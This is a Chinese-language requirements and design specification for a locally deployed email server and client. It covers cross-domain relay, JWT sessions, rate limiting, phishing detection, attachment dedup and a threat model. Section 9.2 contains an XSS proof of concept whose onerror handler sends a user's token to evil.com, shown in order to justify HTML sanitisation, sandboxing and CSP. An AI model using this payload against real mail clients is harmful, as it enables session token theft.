## 1 产品概述

### 1.1 背景与目标

企业与个人对电子邮件的安全性、可控性和智能化提出了越来越高的要求。本项目旨在从零构建一套 **本地部署、可测试、具备安全设计与基础智能能力** 的邮箱系统，涵盖服务端与客户端，满足以下核心目标：

1. **可用**：完整的邮件收发、管理、附件处理链路。
2. **可测**：所有功能均提供可复现的测试步骤与结果。
3. **安全**：覆盖传输安全、存储安全、认证安全、反滥用等多维度防护。
4. **智能**：引入关键词提取、邮件分类、模糊搜索、附件去重等算法能力。

### 1.2 核心约束

- **禁止**直接使用成熟开源邮箱系统（如 James、Postfix）作为核心实现。
- **允许**使用通用网络库（如 Netty / asyncio）和基础加密库（如 OpenSSL / PyCryptodome），但需在协议说明中标注用途。
- 所有功能必须附带可复现测试步骤与结果。

### 1.3 用户角色

| 角色       | 说明                                       |
| ---------- | ------------------------------------------ |
| 普通用户   | 使用客户端进行注册、登录、收发邮件等操作   |
| 系统管理员 | 部署与管理服务端，查看审计日志与异常告警   |

### 2.2 双域名服务器拓扑

系统需同时运行两个独立服务器实例，模拟两个隔离域名（如 `alpha.local` 与 `beta.local`），满足以下要求：

- 各自拥有独立的用户数据存储目录，逻辑完全隔离。
- 通过 **服务器间中继协议（Server-to-Server Relay）** 实现跨域邮件投递。
- 中继通道同样需启用身份验证与传输加密。

```
┌──────────────┐    S2S Relay (TLS)    ┌──────────────┐
│ Server Alpha │ ◄──────────────────► │ Server Beta  │
│ alpha.local  │                       │ beta.local   │
│ Port: 8001   │                       │ Port: 8002   │
│ Data: /alpha │                       │ Data: /beta  │
└──────┬───────┘                       └──────┬───────┘
       │                                       │
  Client A/B                              Client C/D
```

## 3 功能需求

### 3.1 P0 — 必做功能

#### 3.1.1 用户管理

| 编号   | 功能       | 描述                                                                                          | 验收标准                                      |
| ------ | ---------- | --------------------------------------------------------------------------------------------- | --------------------------------------------- |
| U-001  | 注册       | 用户输入用户名、密码、确认密码完成注册；用户名需唯一，密码需满足强度策略（≥8位，含大小写+数字）。  | 注册成功后可登录；重复用户名提示已存在。       |
| U-002  | 登录       | 用户名 + 密码登录，服务端签发会话凭证（Token / Session）。                                      | 登录成功返回凭证；错误密码提示失败。           |
| U-003  | 会话管理   | 登录后通过 Token 进行后续免密交互，Token 设有过期时间与刷新机制。                                | Token 过期后需重新登录；伪造 Token 拒绝访问。  |
| U-004  | 登出       | 主动注销会话，服务端销毁 Token。                                                               | 登出后 Token 不可复用。                        |

#### 3.1.2 邮件管理

| 编号   | 功能           | 描述                                                                                          | 验收标准                                                      |
| ------ | -------------- | --------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| M-001  | 写邮件         | 填写收件人（支持跨域地址如 user@beta.local）、主题、正文、附件。                                 | 邮件发送成功，收件人可在收件箱查看。                            |
| M-002  | 收件箱         | 展示当前用户收到的所有邮件，按时间倒序排列，支持分页。                                           | 邮件列表正确展示；未读邮件有标记。                              |
| M-003  | 发件箱         | 展示当前用户已发送的所有邮件。                                                                  | 发送记录完整可查。                                              |
| M-004  | 草稿箱         | 编写中的邮件可保存为草稿，后续可编辑或发送。                                                     | 草稿保存/加载/发送正常。                                        |
| M-005  | 群发           | 支持向多个收件人同时发送邮件。                                                                  | 所有收件人均收到邮件；发件箱仅显示一条记录。                     |
| M-006  | 群组           | 创建/管理收件人群组，发送时可选择群组作为收件人。                                                 | 群组成员均收到邮件。                                            |
| M-007  | 邮件撤回       | 发送后可撤回邮件，需经服务端核验（发送人身份、时间窗口、邮件状态）。                               | 撤回成功后收件人侧邮件标记为"已撤回"；超时/非本人撤回被拒绝。    |
| M-008  | 快速回复       | 自动补全收件人与主题上下文，提供 3 条快捷回复建议。                                              | 回复时收件人/主题自动填充；推荐文案合理。                        |
| M-009  | 图片附件       | 支持图片附件的上传、存储、下载、预览；附件大小限制 ≤ 10MB/个。                                   | 附件完整收发，图片可预览。                                      |

#### 3.1.3 邮件快捷操作

邮件正文中可嵌入结构化快捷操作按钮，用户点击后执行特定动作。设计以下快捷操作类型：

| 操作类型         | 描述                                                         | 安全设计                                             |
| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| 📅 添加日程      | 将邮件中的时间/事件一键添加到本地日历/待办。                   | 仅解析白名单字段（标题、时间、地点），禁止执行脚本。    |
| ✅ 一键确认/拒绝  | 会议邀请、审批流程等场景下的快速反馈按钮。                      | 操作需二次确认弹窗，附带操作人身份签名。                |
| 🔗 安全链接跳转   | 对邮件中的外部链接进行安全检测后跳转。                         | 先经过 URL 安全检查（域名白名单 + 钓鱼检测），再跳转。  |
| 📋 内容摘要复制   | 一键复制邮件摘要（AI 提取的关键信息）到剪贴板。                | 仅提取纯文本，过滤 HTML/脚本内容。                      |

> **安全原则**：所有快捷操作在客户端沙箱环境中执行，禁止访问本地文件系统或执行任意代码。操作指令需经过签名校验，防止伪造。

#### 3.1.4 服务器管理

| 编号   | 功能           | 描述                                                          | 验收标准                                              |
| ------ | -------------- | ------------------------------------------------------------- | ----------------------------------------------------- |
| S-001  | 双域名部署     | 支持同时启动两个服务器实例，各自绑定不同端口与数据目录。         | 两个实例独立运行，数据目录完全隔离。                    |
| S-002  | 跨域邮件中继   | 服务器间通过 S2S 协议完成跨域邮件投递。                         | alpha.local 用户可向 beta.local 用户发信，反之亦然。    |
| S-003  | 存储隔离       | 各域名服务器使用独立存储路径，禁止直接读写对方数据。              | 通过路径检查验证隔离性。                                |

### 3.2 P1 — 算法增强功能（至少实现 2 项）

| 编号   | 功能                   | 描述                                                                                              | 算法方案                                                        |
| ------ | ---------------------- | ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| A-001  | 关键词提取与邮件分类   | 自动从邮件正文提取关键词，并分类至预定义类别（工作、通知、广告、社交等）。                            | TF-IDF 关键词提取 + 朴素贝叶斯/SVM 分类器。                      |
| A-002  | 邮件搜索（模糊搜索）   | 支持按联系人、关键词搜索邮件，容忍拼写错误。                                                        | 倒排索引 + 编辑距离（Levenshtein）/ N-Gram 模糊匹配。             |
| A-003  | 存储空间优化           | 附件去重（相同文件仅存储一份），同时保证文件安全（引用计数 + 完整性校验）。                           | SHA-256 内容哈希去重 + 引用计数 + HMAC 完整性校验。               |
| A-004  | 智能图片附件功能       | 对图片附件进行智能处理，如：OCR 文字识别提取图片中的文本、敏感图片检测与标记、自动缩略图生成。         | 轻量 OCR（Tesseract）/ 图片指纹（pHash）/ 缩略图自动压缩生成。    |

**本项目选定实现**：A-001（关键词提取与邮件分类）、A-002（邮件搜索）、A-003（存储空间优化）。

### 3.3 P0 — 安全与稳定性

#### 3.3.1 认证与会话安全

| 编号    | 安全能力                 | 设计方案                                                                                                                        |
| ------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
| SEC-001 | 会话令牌机制             | 登录成功后签发 JWT（含用户ID、过期时间、签名），后续请求通过 Bearer Token 鉴权。Token 有效期 30 分钟，支持 Refresh Token 续期。       |
| SEC-002 | 传输安全                 | 客户端与服务端之间通信全程 TLS 加密；服务器间中继同样启用 TLS 双向认证。                                                           |
| SEC-003 | 密码存储                 | 使用 bcrypt（cost=12）对用户密码进行加盐哈希存储，禁止明文。                                                                       |
| SEC-004 | Token 防重放             | JWT 中包含 `jti`（唯一ID）与 `iat`（签发时间），服务端维护短期黑名单（登出/撤销的 Token）。                                          |

#### 3.3.2 防暴力破解

| 策略         | 描述                                                                          |
| ------------ | ----------------------------------------------------------------------------- |
| 速率限制     | 同一 IP 5 分钟内连续登录失败 5 次，锁定该 IP 15 分钟。                          |
| 账号锁定     | 同一账号 10 分钟内连续失败 10 次，锁定账号 30 分钟，需管理员或验证码解锁。       |
| 验证码       | 连续失败 3 次后触发图形验证码（CAPTCHA）。                                      |
| 告警通知     | 触发锁定时记录审计日志并告警。                                                  |

#### 3.3.3 防滥发 / DoS 防护

| 策略             | 描述                                                                  |
| ---------------- | --------------------------------------------------------------------- |
| 发送频率限制     | 单用户每分钟最多发送 10 封邮件，每小时最多 60 封。                      |
| 连接限流         | 单 IP 最大并发连接数 50，超出直接拒绝。                                 |
| 请求大小限制     | 单封邮件（含附件）≤ 15MB，超出拒绝。                                   |
| 滑动窗口计数     | 基于滑动窗口算法实现精确限流，避免边界突发。                             |

#### 3.3.4 钓鱼 / 垃圾邮件识别

| 策略              | 描述                                                                                      |
| ----------------- | ----------------------------------------------------------------------------------------- |
| URL 检测          | 提取邮件正文中的 URL，与已知钓鱼域名黑名单比对；检测 URL 混淆（如 homograph 攻击）。         |
| 关键词规则引擎    | 基于敏感词库（如"中奖""验证码""紧急转账"等）+ 权重评分判定垃圾邮件。                         |
| 发件人信誉评分    | 基于历史行为（发送频率、被举报次数）计算发件人信誉分，低于阈值自动标记为垃圾邮件。            |
| 邮件标记          | 疑似钓鱼/垃圾邮件在收件箱中显示 ⚠️ 警告标记，不直接删除，由用户决定。                       |

#### 3.3.5 邮件撤回安全核验

| 校验项       | 描述                                                       |
| ------------ | ---------------------------------------------------------- |
| 身份校验     | 仅邮件发送者本人可发起撤回请求（校验 Token 中的用户身份）。   |
| 时间窗口     | 发送后 5 分钟内可撤回，超时拒绝。                            |
| 状态校验     | 若邮件已被标记为"已读"，撤回请求仍可执行但提示收件人可能已阅。 |
| 操作签名     | 撤回请求附带 HMAC 签名，防止指令被篡改或伪造。               |
| 幂等性       | 同一邮件不可重复撤回；重复请求返回"已撤回"状态。             |

## 4 非功能需求

### 4.1 性能指标

| 指标               | 目标值                                 |
| ------------------ | -------------------------------------- |
| 单封邮件发送延迟   | ≤ 500ms（不含附件上传时间）             |
| 跨域邮件投递延迟   | ≤ 2s                                   |
| 并发客户端数       | 单服务器支持 ≥ 100 并发连接             |
| 邮件搜索响应时间   | ≤ 1s（10 万封邮件规模）                 |

### 4.2 可靠性

- 邮件投递保证：至少一次投递（At-Least-Once），服务端持久化后再返回成功。
- 服务异常恢复：服务器重启后自动恢复邮件队列中未投递的邮件。
- 数据持久化：所有邮件与用户数据写入磁盘后返回确认。

### 4.3 可维护性

- 模块化设计：认证、邮件、存储、安全、智能引擎各自独立模块。
- 配置外置：端口、数据目录、TLS 证书路径、限流参数等通过配置文件管理。
- 日志规范：统一日志格式（JSON），包含时间戳、级别、模块、请求ID、消息。

## 5 通信协议设计

### 5.1 消息格式

采用 **JSON over TCP** 的自定义协议，每条消息以 `\r\n` 分隔。

#### 请求格式

```json
{
  "version": "1.0",
  "type": "REQUEST",
  "action": "SEND_MAIL",
  "request_id": "uuid-v4",
  "token": "jwt-token-here",
  "payload": {
    "to": ["alice@beta.local"],
    "subject": "Hello",
    "body": "Hi Alice!",
    "attachments": [
      {
        "filename": "photo.jpg",
        "content_type": "image/jpeg",
        "data_base64": "..."
      }
    ]
  }
}
```

#### 响应格式

```json
{
  "version": "1.0",
  "type": "RESPONSE",
  "request_id": "uuid-v4",
  "status": 200,
  "message": "OK",
  "payload": { }
}
```

### 5.2 主要 Action 列表

| Action              | 说明             | 是否需要 Token |
| ------------------- | ---------------- | -------------- |
| `REGISTER`          | 用户注册         | 否             |
| `LOGIN`             | 用户登录         | 否             |
| `LOGOUT`            | 用户登出         | 是             |
| `SEND_MAIL`         | 发送邮件         | 是             |
| `LIST_INBOX`        | 查看收件箱       | 是             |
| `LIST_SENT`         | 查看发件箱       | 是             |
| `LIST_DRAFTS`       | 查看草稿箱       | 是             |
| `SAVE_DRAFT`        | 保存草稿         | 是             |
| `RECALL_MAIL`       | 撤回邮件         | 是             |
| `READ_MAIL`         | 查看邮件详情     | 是             |
| `SEARCH_MAIL`       | 搜索邮件         | 是             |
| `DOWNLOAD_ATTACH`   | 下载附件         | 是             |
| `CREATE_GROUP`      | 创建群组         | 是             |
| `QUICK_REPLY`       | 获取快捷回复建议 | 是             |
| `EXEC_ACTION`       | 执行快捷操作     | 是             |
| `S2S_DELIVER`       | 服务器间邮件中继 | 服务器证书     |

### 5.3 鉴权流程

```
Client                          Server
  │                                │
  │──── LOGIN(user, pass) ────────►│
  │                                │── 验证密码(bcrypt)
  │                                │── 检查暴力破解锁定
  │                                │── 签发 JWT + Refresh Token
  │◄─── {access_token, refresh} ───│
  │                                │
  │──── SEND_MAIL(token, ...) ───►│
  │                                │── 验证 JWT 签名 & 过期
  │                                │── 检查发送频率限制
  │                                │── 处理邮件
  │◄─── {status: 200} ────────────│
  │                                │
  │──── REFRESH(refresh_token) ──►│
  │                                │── 验证 Refresh Token
  │◄─── {new_access_token} ───────│
```

## 7 存储与附件策略

### 7.1 目录结构

```
data/
├── alpha.local/                  # 域名 alpha 的数据根目录
│   ├── users/                    # 用户数据
│   │   └── {user_id}/
│   │       ├── inbox/            # 收件箱（邮件元数据引用）
│   │       ├── sent/             # 发件箱
│   │       └── drafts/           # 草稿箱
│   ├── emails/                   # 邮件内容存储
│   ├── attachments/              # 附件存储（按哈希寻址）
│   │   └── {hash[0:2]}/{hash[2:4]}/{full_hash}
│   ├── index/                    # 搜索倒排索引
│   └── audit/                    # 审计日志
└── beta.local/                   # 域名 beta 的数据根目录（结构同上）
```

### 7.2 附件去重机制

1. 上传附件时计算 SHA-256 哈希。
2. 若哈希已存在，跳过写入，引用计数 +1。
3. 删除邮件时引用计数 -1，归零后物理删除文件。
4. 存储文件时附加 HMAC 校验值，读取时验证完整性，防止篡改。

## 8 智能功能详细设计

### 8.1 关键词提取与邮件分类

**关键词提取**：
- 对邮件正文进行分词（中文使用 jieba，英文使用空格分词 + 停用词过滤）。
- 使用 TF-IDF 算法计算词权重，取 Top-5 作为关键词。

**邮件分类**：
- 预定义分类：`工作`、`通知`、`广告/营销`、`社交`、`其他`。
- 训练朴素贝叶斯分类器，基于关键词特征向量进行分类。
- 新邮件到达时自动分类并打标签，用户可手动修正（修正数据反馈训练集）。

### 8.2 邮件搜索

**索引构建**：
- 邮件写入时同步更新倒排索引（发件人、收件人、主题、正文关键词）。
- 索引结构：`keyword → [(email_id, position, score)]`。

**模糊搜索**：
- 查询词与索引词通过编辑距离（阈值 ≤ 2）进行模糊匹配。
- 同时支持 N-Gram（N=3）索引加速模糊查询。
- 搜索结果按相关性评分排序。

### 8.3 存储空间优化

见 §7.2 附件去重机制。额外考虑：
- 去重粒度：文件级去重（非分块去重，简化实现）。
- 安全性：去重不跨域（alpha 和 beta 各自独立去重），防止信息泄露。
- 统计面板：可查看去重节省的存储空间。

## 9 安全威胁模型

### 9.1 威胁矩阵

| 威胁                     | 风险等级 | 防护措施                                            |
| ------------------------ | -------- | --------------------------------------------------- |
| 暴力破解密码             | 高       | 速率限制 + 账号锁定 + 验证码（§3.3.2）               |
| 中间人攻击（MitM）       | 高       | 全链路 TLS 加密（§3.3.1 SEC-002）                    |
| 密码泄露                 | 高       | bcrypt 加盐哈希存储（§3.3.1 SEC-003）                |
| 会话劫持                 | 中       | JWT 短有效期 + Refresh Token + Token 黑名单           |
| 邮件伪造撤回             | 中       | HMAC 签名校验 + 身份/时间窗口验证（§3.3.5）          |
| XSS / 脚本注入           | 中       | 邮件正文 HTML 清洗 + 快捷操作沙箱执行                 |
| 钓鱼邮件                 | 中       | URL 黑名单 + 关键词规则 + 信誉评分（§3.3.4）         |
| DoS / 滥发               | 中       | 多维度限流（§3.3.3）                                 |
| 跨域数据窃取             | 低       | 存储目录物理隔离 + 路径校验                           |

### 9.2 恶意脚本 PoC 分析（加分项）

**攻击向量**：攻击者在邮件正文中嵌入恶意 HTML/JavaScript，当收件人查看邮件时执行：

```html
<!-- PoC: 恶意邮件正文 -->
<img src="x" onerror="
  fetch('/api/user/profile')
    .then(r=>r.json())
    .then(d=>{
      new Image().src='https://evil.com/steal?token='+d.token
    })
">
```

**防护方案**：
1. **服务端**：存储前对邮件正文进行 HTML Sanitize，移除所有 `<script>`、事件属性（`onerror`、`onclick` 等）、`<iframe>` 等危险标签。
2. **客户端**：邮件正文在沙箱环境中渲染（如 `<iframe sandbox>`），禁止 JavaScript 执行。
3. **CSP 策略**：设置 `Content-Security-Policy: script-src 'none'` 阻止脚本执行。
